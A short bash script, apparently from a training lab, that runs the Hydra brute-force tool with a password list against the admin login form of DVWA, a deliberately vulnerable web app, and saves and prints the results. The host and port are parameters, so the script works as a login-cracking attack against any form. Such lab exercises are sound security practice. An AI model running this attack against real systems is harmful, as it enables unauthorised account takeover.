#!/usr/bin/env bash
#
# denis-play-backend/plays/play-02-hydra-dvwa/run.sh


# muda para o diretório do script

cd "$(dirname "$0")"

# host e porta padrão (serviço docker-compose)

HOST=${1:-dvwa}
PORT=${2:-80}

echo "[*] Iniciando ataque com Hydra contra $HOST:$PORT..."
sleep 1

# hydra espera primeiro o HOST (sem :porta) e -s porta separadamente
hydra -l admin \
      -P passwords.txt \
      -s "$PORT" \
      "$HOST" http-form-post \
      "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
      -t 4 -V > resultado.txt

echo
echo "[📄] Saída do Hydra:"
cat resultado.txt
echo
echo "[✔️] Teste concluído com sucesso."
